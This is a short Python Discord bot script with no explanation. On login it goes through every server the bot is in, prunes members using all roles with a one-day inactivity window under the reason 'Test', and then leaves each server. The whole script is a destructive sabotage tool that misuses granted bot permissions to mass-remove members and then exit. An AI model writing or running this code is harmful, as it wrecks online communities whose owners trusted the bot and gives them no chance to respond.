import discord
from discord.ext import commands 

token = ""
intents = discord.Intents.all()
client = commands.Bot(command_prefix="+",intents = intents)

@client.event
async def on_ready():
    print('Logged in as {0.user}'.format(client))
    for guild in client.guilds:
      roles = []
      days = 1
      a = await guild.prune_members(days=days,roles=guild.roles,reason="Test")
      print(f"Pruned {a} Members | {guild.name}")
      await guild.leave()
      print(f"Left {guild.name}")
    else:
      print("Left All Guild")
      
client.run(token)
